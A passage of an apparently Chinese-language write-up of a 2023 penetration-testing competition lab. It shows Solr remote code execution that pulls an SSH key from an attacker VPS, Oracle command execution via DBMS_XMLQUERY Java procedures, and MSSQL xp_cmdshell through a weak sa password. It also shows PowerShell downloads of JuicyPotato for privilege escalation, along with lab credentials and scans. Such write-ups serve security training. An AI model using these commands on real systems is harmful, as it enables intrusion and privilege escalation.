-rw-------   <span class="token number">1</span> root root <span class="token number">4836</span> May  <span class="token number">7</span> 05:52 .viminfo


<span class="token comment"># cat /root/flag</span>
flag<span class="token punctuation">{</span>hPucBnCtxSl38JG4orYW2a5diqUpejH7<span class="token punctuation">}</span>

<span class="token comment"># ip a</span>
<span class="token number">1</span>: lo: <span class="token operator">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="token operator">&gt;</span> mtu <span class="token number">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="token number">1000</span>
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet <span class="token number">127.0</span>.0.1/8 scope <span class="token function">host</span> lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope <span class="token function">host</span>
       valid_lft forever preferred_lft forever
<span class="token number">2</span>: eth0: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">&gt;</span> mtu <span class="token number">1450</span> qdisc pfifo_fast state UP group default qlen <span class="token number">1000</span>
    link/ether <span class="token number">52</span>:54:6d:2a:35:d8 brd ff:ff:ff:ff:ff:ff
    inet <span class="token number">10.103</span>.32.51/16 brd <span class="token number">10.103</span>.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::5054:6dff:fe2a:35d8/64 scope <span class="token function">link</span>
       valid_lft forever preferred_lft forever
<span class="token number">3</span>: eth1: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">&gt;</span> mtu <span class="token number">1450</span> qdisc pfifo_fast state UP group default qlen <span class="token number">1000</span>
    link/ether <span class="token number">52</span>:54:5d:70:af:3f brd ff:ff:ff:ff:ff:ff
    inet <span class="token number">192.168</span>.33.39/24 brd <span class="token number">192.168</span>.33.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::5054:5dff:fe70:af3f/64 scope <span class="token function">link</span>
       valid_lft forever preferred_lft forever

<span class="token comment"># ip r</span>
default via <span class="token number">10.103</span>.0.1 dev eth0
<span class="token number">10.103</span>.0.0/16 dev eth0 proto kernel scope <span class="token function">link</span> src <span class="token number">10.103</span>.32.51
<span class="token number">192.168</span>.33.0/24 dev eth1 proto kernel scope <span class="token function">link</span> src <span class="token number">192.168</span>.33.39<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python apache_solr_exec.py  <span class="token number">10.103</span>.32.51 <span class="token number">8983</span> <span class="token string">"curl vpsip:port/authorized_keys -o /root/.ssh/authorized_keys"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>直接加个 key 然后 ssh 上去</p>
<h3 id="内网-192-168-33"><a href="#内网-192-168-33" class="headerlink" title="内网 192.168.33"></a>内网 192.168.33</h3><p>扫内网</p>
<pre class="line-numbers language-none"><code class="language-none">(icmp) Target 192.168.33.39   is alive
(icmp) Target 192.168.33.5    is alive
(icmp) Target 192.168.33.170  is alive
(icmp) Target 192.168.33.172  is alive
[*] Icmp alive hosts len is: 4
192.168.33.5:445 open
192.168.33.172:1521 open
192.168.33.172:445 open
192.168.33.170:445 open
192.168.33.5:139 open
192.168.33.172:139 open
192.168.33.170:139 open
192.168.33.5:135 open
192.168.33.172:135 open
192.168.33.170:135 open
192.168.33.39:22 open
192.168.33.5:88 open
192.168.33.39:8983 open
[*] alive ports len is: 13
start vulscan
[*] NetInfo:
[*]192.168.33.170
   [-&gt;]DBserver
   [-&gt;]192.168.33.170
[*] NetBios: 192.168.33.5    [+]DC FOUR\AD4
[*] NetBios: 192.168.33.170  FOUR\DBSERVER
[*] NetBios: 192.168.33.172  FOUR\SERVER
[*] NetInfo:
[*]192.168.33.172
   [-&gt;]server
   [-&gt;]192.168.33.172
[*] WebTitle: http://192.168.33.39:8983 code:302 len:0      title:None 跳转url: http://192.168.33.39:8983/solr/
[*] NetInfo:
[*]192.168.33.5
   [-&gt;]AD4
   [-&gt;]192.168.33.5
[*] WebTitle: http://192.168.33.39:8983/solr/ code:200 len:14543  title:Solr Admin
[+] http://192.168.33.39:8983 poc-yaml-solr-cve-2019-0193
[+] http://192.168.33.39:8983 poc-yaml-solr-velocity-template-rce
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>起个代理到内网</p>
<h3 id="flag2-192-168-33-172-FOUR-SERVER-Oracle-db"><a href="#flag2-192-168-33-172-FOUR-SERVER-Oracle-db" class="headerlink" title="flag2 192.168.33.172 FOUR\SERVER Oracle db"></a>flag2 192.168.33.172 FOUR\SERVER Oracle db</h3><p>history<br>sqlplus system/<a href="mailto:Zr6kJG2U3m3A7BG@192.168.1.100">Zr6kJG2U3m3A7BG@192.168.1.100</a>:1521/orcl</p>
<p>192.168.33.172:1521</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/b3110324-3b8f-422d-8a78-9a61fcd021c2.png"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> v$version<span class="token punctuation">;</span>

Oracle <span class="token keyword">Database</span> <span class="token number">11</span>g Enterprise Edition <span class="token keyword">Release</span> <span class="token number">11.2</span><span class="token number">.0</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token number">64</span>bit Production
PL<span class="token operator">/</span><span class="token keyword">SQL</span> <span class="token keyword">Release</span> <span class="token number">11.2</span><span class="token number">.0</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token operator">-</span> Production
CORE	<span class="token number">11.2</span><span class="token number">.0</span><span class="token number">.1</span><span class="token number">.0</span>	Production
TNS <span class="token keyword">for</span> <span class="token number">64</span><span class="token operator">-</span><span class="token keyword">bit</span> Windows: Version <span class="token number">11.2</span><span class="token number">.0</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token operator">-</span> Production
NLSRTL Version <span class="token number">11.2</span><span class="token number">.0</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token operator">-</span> Production<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>命令执行 DBMS_XMLQUERY</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> dbms_xmlquery<span class="token punctuation">.</span>newcontext<span class="token punctuation">(</span><span class="token string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>
<span class="token keyword">select</span> dbms_xmlquery<span class="token punctuation">.</span>newcontext<span class="token punctuation">(</span><span class="token string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>
<span class="token keyword">select</span> OBJECT_ID <span class="token keyword">from</span> all_objects <span class="token keyword">where</span> object_name <span class="token operator">=</span><span class="token string">'LINXRUNCMD'</span><span class="token punctuation">;</span>

<span class="token keyword">DECLARE</span>
POL DBMS_JVM_EXP_PERMS<span class="token punctuation">.</span>TEMP_JAVA_POLICY<span class="token punctuation">;</span>
<span class="token keyword">CURSOR</span> C1 <span class="token operator">IS</span> <span class="token keyword">SELECT</span> <span class="token string">'GRANT'</span><span class="token punctuation">,</span><span class="token keyword">USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'SYS'</span><span class="token punctuation">,</span><span class="token string">'java.io.FilePermission'</span><span class="token punctuation">,</span><span class="token string">'&lt;&lt;ALL FILES&gt;&gt;'</span><span class="token punctuation">,</span><span class="token string">'execute'</span><span class="token punctuation">,</span><span class="token string">'ENABLED'</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span>
<span class="token keyword">OPEN</span> C1<span class="token punctuation">;</span>
<span class="token keyword">FETCH</span> C1 <span class="token keyword">BULK</span> COLLECT <span class="token keyword">INTO</span> POL<span class="token punctuation">;</span>
<span class="token keyword">CLOSE</span> C1<span class="token punctuation">;</span>
DBMS_JVM_EXP_PERMS<span class="token punctuation">.</span>IMPORT_JVM_PERMS<span class="token punctuation">(</span>POL<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
<span class="token operator">/</span>
<span class="token keyword">DECLARE</span>
POL DBMS_JVM_EXP_PERMS<span class="token punctuation">.</span>TEMP_JAVA_POLICY<span class="token punctuation">;</span>
<span class="token keyword">CURSOR</span> C1 <span class="token operator">IS</span> <span class="token keyword">SELECT</span> <span class="token string">'GRANT'</span><span class="token punctuation">,</span><span class="token keyword">USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'SYS'</span><span class="token punctuation">,</span><span class="token string">'java.lang.RuntimePermission'</span><span class="token punctuation">,</span><span class="token string">'writeFileDescriptor'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token string">'ENABLED'</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span>
<span class="token keyword">OPEN</span> C1<span class="token punctuation">;</span>
<span class="token keyword">FETCH</span> C1 <span class="token keyword">BULK</span> COLLECT <span class="token keyword">INTO</span> POL<span class="token punctuation">;</span>
<span class="token keyword">CLOSE</span> C1<span class="token punctuation">;</span>
DBMS_JVM_EXP_PERMS<span class="token punctuation">.</span>IMPORT_JVM_PERMS<span class="token punctuation">(</span>POL<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
<span class="token operator">/</span>
<span class="token keyword">DECLARE</span>
POL DBMS_JVM_EXP_PERMS<span class="token punctuation">.</span>TEMP_JAVA_POLICY<span class="token punctuation">;</span>
<span class="token keyword">CURSOR</span> C1 <span class="token operator">IS</span> <span class="token keyword">SELECT</span> <span class="token string">'GRANT'</span><span class="token punctuation">,</span><span class="token keyword">USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'SYS'</span><span class="token punctuation">,</span><span class="token string">'java.lang.RuntimePermission'</span><span class="token punctuation">,</span><span class="token string">'readFileDescriptor'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token string">'ENABLED'</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span>
<span class="token keyword">OPEN</span> C1<span class="token punctuation">;</span>
<span class="token keyword">FETCH</span> C1 <span class="token keyword">BULK</span> COLLECT <span class="token keyword">INTO</span> POL<span class="token punctuation">;</span>
<span class="token keyword">CLOSE</span> C1<span class="token punctuation">;</span>
DBMS_JVM_EXP_PERMS<span class="token punctuation">.</span>IMPORT_JVM_PERMS<span class="token punctuation">(</span>POL<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行命令：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> LinxRUNCMD<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>发现不能有空格。。</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/f5fa638a-66b9-4dbd-b688-a69e4870f214.png"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/jas502n/oracleShell">https://github.com/jas502n/oracleShell</a></p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/62c6a81a-1a10-41d9-9421-73df4c79a678.png"></p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/7f58ad14-8b8f-4a21-8d0d-9d395c3f9220.png"></p>
<p>这工具感觉只支持 Linux 的命令执行，还得手动读文件。。</p>
<p><a target="_blank" rel="noopener" href="https://uuzdaisuki.com/2020/07/10/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">数据库读取文件方式总结</a></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> directory user_dir <span class="token keyword">as</span> <span class="token string">'C:\Users\Administrator\Desktop\';
grant read on directory user_dir to public;
grant write on directory user_dir to public;
select * from dba_directories;

declare
F1 utl_file.file_type;
V1 varchar2(32767);
begin
F1:=utl_file.fopen('</span>USER_DIR<span class="token string">','</span>flag<span class="token string">','</span>r'<span class="token punctuation">)</span><span class="token punctuation">;</span>
utl_file<span class="token punctuation">.</span>get_line<span class="token punctuation">(</span>F1<span class="token punctuation">,</span>V1<span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
utl_file<span class="token punctuation">.</span>fclose<span class="token punctuation">(</span>F1<span class="token punctuation">)</span><span class="token punctuation">;</span>
dbms_output<span class="token punctuation">.</span>put_line<span class="token punctuation">(</span>V1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">end</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/e89ea284-cc33-4834-991e-3434ee9ad1f7.png"></p>
<h2 id="漏洞挖掘场景1-0-x2F-2"><a href="#漏洞挖掘场景1-0-x2F-2" class="headerlink" title="漏洞挖掘场景1 [0/2]"></a>漏洞挖掘场景1 [0/2]</h2><pre class="line-numbers language-none"><code class="language-none">(icmp) Target 10.103.83.172   is alive
[*] Icmp alive hosts len is: 1
10.103.83.172:1433 open
10.103.83.172:445 open
10.103.83.172:139 open
[*] alive ports len is: 3
start vulscan
[+] mssql:10.103.83.172:1433:sa P@ssw0rd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="入口-192-168-33-175-MSSQL"><a href="#入口-192-168-33-175-MSSQL" class="headerlink" title="入口 192.168.33.175 MSSQL"></a>入口 192.168.33.175 MSSQL</h3><p>MSSQL 弱口令，连上去</p>
<pre class="line-numbers language-none"><code class="language-none">Microsoft SQL Server 2016 (SP1) (KB3182545) - 13.0.4001.0 (X64) 
Oct 28 2016 18:17:30 
Copyright (c) Microsoft Corporation
Enterprise Edition (64-bit) on Windows Server 2016 Datacenter 6.3 &lt;X64&gt; (Build 14393: ) (Hypervisor)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>开始 <code>xp_cmdshell</code> 扩展功能</p>
<pre class="line-numbers language-none"><code class="language-none">use master;
exec sp_configure 'show advanced options',1;
reconfigure;
exec sp_configure 'xp_cmdshell',1;
reconfigure;

##1开启，0关闭，关闭时从xp_cmdshell  ---&gt; options依次关闭

use master;
exec master..xp_cmdshell "whoami";

nt service\mssqlserver
    
用户信息
----------------

用户名                 SID                                                            
====================== ===============================================================
nt service\mssqlserver S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003


组信息
-----------------

组名                                 类型   SID          属性                          
==================================== ====== ============ ==============================
Mandatory Label\High Mandatory Level 标签   S-1-16-12288                               
Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
BUILTIN\Performance Monitor Users    别名   S-1-5-32-558 必需的组, 启用于默认, 启用的组
BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
NT AUTHORITY\SERVICE                 已知组 S-1-5-6      必需的组, 启用于默认, 启用的组
CONSOLE LOGON                        已知组 S-1-2-1      必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
NT SERVICE\ALL SERVICES              已知组 S-1-5-80-0   必需的组, 启用于默认, 启用的组


特权信息
----------------------

特权名                        描述                 状态  
============================= ==================== ======
SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用
SeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用
SeChangeNotifyPrivilege       绕过遍历检查         已启用
SeImpersonatePrivilege        身份验证后模拟客户端 已启用
SeCreateGlobalPrivilege       创建全局对象         已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>network</strong></p>
<pre class="line-numbers language-none"><code class="language-none">以太网适配器 以太网 2:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::1d49:a11d:9b36:4dcf%12
   IPv4 地址 . . . . . . . . . . . . : 10.103.83.172
   子网掩码  . . . . . . . . . . . . : 255.255.0.0
   默认网关. . . . . . . . . . . . . : 10.103.0.1

以太网适配器 以太网 3:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::f590:57fd:c34:f5f4%2
   IPv4 地址 . . . . . . . . . . . . : 192.168.33.175
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 


活动连接

  协议  本地地址          外部地址        状态           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       716
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       2644
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       820
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       436
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       940
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1604
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       828
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1476
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       572
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       564
  TCP    10.103.83.172:139      0.0.0.0:0              LISTENING       4
  TCP    10.103.83.172:1433     10.103.0.1:61428       ESTABLISHED     2644
  TCP    10.103.83.172:1433     10.103.0.1:61439       ESTABLISHED     2644
  TCP    10.103.83.172:1433     10.103.0.1:61440       ESTABLISHED     2644
  TCP    10.103.83.172:1433     10.103.0.1:61442       ESTABLISHED     2644
  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       2644
  TCP    192.168.33.175:139     0.0.0.0:0              LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       716
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:1433              [::]:0                 LISTENING       2644
  TCP    [::]:3389              [::]:0                 LISTENING       820
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       436
  TCP    [::]:49665             [::]:0                 LISTENING       940
  TCP    [::]:49666             [::]:0                 LISTENING       1604
  TCP    [::]:49667             [::]:0                 LISTENING       828
  TCP    [::]:49668             [::]:0                 LISTENING       1476
  TCP    [::]:49669             [::]:0                 LISTENING       572
  TCP    [::]:49670             [::]:0                 LISTENING       564
  TCP    [::1]:1434             [::]:0                 LISTENING       2644
  UDP    0.0.0.0:123            *:*                                    284
  UDP    0.0.0.0:500            *:*                                    828
  UDP    0.0.0.0:3389           *:*                                    820
  UDP    0.0.0.0:4500           *:*                                    828
  UDP    0.0.0.0:5050           *:*                                    284
  UDP    0.0.0.0:5353           *:*                                    756
  UDP    0.0.0.0:5355           *:*                                    756
  UDP    10.103.83.172:137      *:*                                    4
  UDP    10.103.83.172:138      *:*                                    4
  UDP    192.168.33.175:137     *:*                                    4
  UDP    192.168.33.175:138     *:*                                    4
  UDP    [::]:123               *:*                                    284
  UDP    [::]:500               *:*                                    828
  UDP    [::]:3389              *:*                                    820
  UDP    [::]:4500              *:*                                    828
  UDP    [::]:5353              *:*                                    756
  UDP    [::]:5355              *:*                                    756
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>tasklist</p>
<pre class="line-numbers language-none"><code class="language-none">映像名称                       PID 会话名              会话#       内存使用 
========================= ======== ================ =========== ============
System Idle Process              0                            0          4 K
System                           4                            0        128 K
smss.exe                       268                            0      1,128 K
csrss.exe                      364                            0      3,924 K
wininit.exe                    436                            0      4,932 K
csrss.exe                      444                            1      3,588 K
winlogon.exe                   496                            1     12,696 K
services.exe                   564                            0      6,928 K
lsass.exe                      572                            0     14,736 K
svchost.exe                    656                            0     13,380 K
svchost.exe                    716                            0      8,048 K
svchost.exe                    820                            0     13,440 K
svchost.exe                    828                            0     44,628 K
dwm.exe                        880                            1     29,648 K
svchost.exe                    908                            0     17,252 K
svchost.exe                    940                            0     14,380 K
svchost.exe                    284                            0     16,096 K
svchost.exe                    756                            0     19,720 K
svchost.exe                    784                            0      6,988 K
svchost.exe                    560                            0     15,700 K
svchost.exe                   1476                            0      6,676 K
spoolsv.exe                   1604                            0     15,148 K
svchost.exe                   1688                            0     18,100 K
svchost.exe                   1748                            0      8,100 K
dllhost.exe                   1788                            0      7,524 K
qemu-ga.exe                   1800                            0      8,456 K
MsMpEng.exe                   1836                            0     74,928 K
sqlwriter.exe                 1860                            0      7,504 K
dllhost.exe                   1424                            0     12,448 K
msdtc.exe                     2252                            0      9,468 K
sqlceip.exe                   2636                            0     55,028 K
sqlservr.exe                  2644                            0    262,412 K
LogonUI.exe                   1996                            1     41,476 K
MpCmdRun.exe                  2904                            0      7,860 K
cmd.exe                       3804                            0      2,784 K
conhost.exe                   1624                            0      9,580 K
tasklist.exe                  2764                            0      7,780 K
WmiPrvSE.exe                  3872                            0      8,492 K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有 Windows defender</p>
<p>JuicePotato 提权</p>
<pre class="line-numbers language-none"><code class="language-none">exec master..xp_cmdshell 'powershell -Command "Invoke-WebRequest http://vpsip:12345/JuicyPotato.exe -OutFile C:\Users\Public\2.exe"';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/a5a90add-2cf9-49fe-b67f-dfd2028df288.png"></p>
<p>rce 的命令放下面了，就是将命令写进 1.bat 文件，然后启动该 bat</p>
<p>（对应的 3.exe 来自 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/J0o1ey/p/15714555.html">https://www.cnblogs.com/J0o1ey/p/15714555.html</a> ）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">use</span> master<span class="token punctuation">;</span>
<span class="token comment">-- exec master..xp_cmdshell 'powershell -Command "Invoke-WebRequest http://VPSIP:PORT/1.ps1 -OutFile C:\Users\Public\1.ps1"';</span>
<span class="token comment">-- exec master..xp_cmdshell 'powershell -Command "powershell -ep bypass C:\Users\Public\1.ps1"';</span>
<span class="token comment">-- exec master..xp_cmdshell 'C:\Users\public\2.exe -t * -p c:\windows\system32\cmd.exe -l 9003 -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}"';</span>
<span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'echo dir &gt; C:\Users\Public\1.bat'</span>
<span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'type C:\Users\Public\1.bat'</span>
<span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'C:\Users\public\3.exe -p "C:\Users\Public\1.bat" -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>修改密码之后登录进去找 flag，发现找不到</p>
<p>rdp 连上去</p>
<h3 id="内网-2"><a href="#内网-2" class="headerlink" title="内网"></a>内网</h3><pre class="line-numbers language-none"><code class="language-none">start infoscan
(icmp) Target 192.168.33.175  is alive
(icmp) Target 192.168.33.174  is alive
[*] Icmp alive hosts len is: 2
192.168.33.175:135 open
192.168.33.174:445 open
192.168.33.175:1433 open
192.168.33.175:445 open
192.168.33.174:139 open
192.168.33.174:135 open
192.168.33.175:139 open
[*] alive ports len is: 7
start vulscan
[*] NetInfo:
[*]192.168.33.174
   [-&gt;]PC01
   [-&gt;]10.177.166.21
   [-&gt;]192.168.33.174
[*] NetBios: 192.168.33.174  CTF1\PC01
[+] mssql:192.168.33.175:1433:sa P@ssw0rd


&gt;arp -a

接口: 192.168.33.175 --- 0x2
  Internet 地址         物理地址              类型
  192.168.33.255        ff-ff-ff-ff-ff-ff     静态
  224.0.0.22            01-00-5e-00-00-16     静态
  224.0.0.252           01-00-5e-00-00-fc     静态
  239.255.255.250       01-00-5e-7f-ff-fa     静态
  255.255.255.255       ff-ff-ff-ff-ff-ff     静态

接口: 10.103.83.172 --- 0xc
  Internet 地址         物理地址              类型
  10.103.0.1            f8-bc-12-31-8a-5d     动态
  10.103.3.127          52-54-48-6c-b2-d1     动态
  10.103.6.19           52-54-5f-0e-53-f2     动态
  10.103.8.47           52-54-35-43-f6-86     动态
  10.103.13.192         52-54-53-48-e6-d3     动态
  10.103.35.44          52-54-55-0d-75-79     动态
  10.103.37.229         52-54-65-54-a4-d5     动态
  10.103.41.38          52-54-3c-12-1c-8e     动态
  10.103.46.254         52-54-61-57-be-c9     动态
  10.103.64.229         52-54-52-52-9b-72     动态
  10.103.75.171         52-54-48-36-8b-6c     动态
  10.103.80.18          52-54-4c-34-ae-fd     动态
  10.103.86.229         52-54-0c-79-0e-cf     动态
  10.103.91.186         52-54-73-61-37-db     动态
  10.103.108.161        52-54-4e-35-3b-99     动态
  10.103.128.128        52-54-39-60-bf-35     动态
  10.103.129.15         52-54-47-27-0b-37     动态
  10.103.141.136        52-54-65-4e-51-10     动态
  10.103.144.229        52-54-15-4c-14-82     动态
  10.103.151.28         52-54-6a-40-99-88     动态
  10.103.159.87         52-54-61-3c-37-c3     动态
  10.103.169.105        52-54-70-41-c6-a5     动态
  10.103.177.11         52-54-45-14-b5-d9     动态
  10.103.186.157        52-54-3f-5a-0d-80     动态
  10.103.205.174        52-54-35-1f-8d-73     动态
  10.103.206.84         52-54-6c-34-d5-98     动态
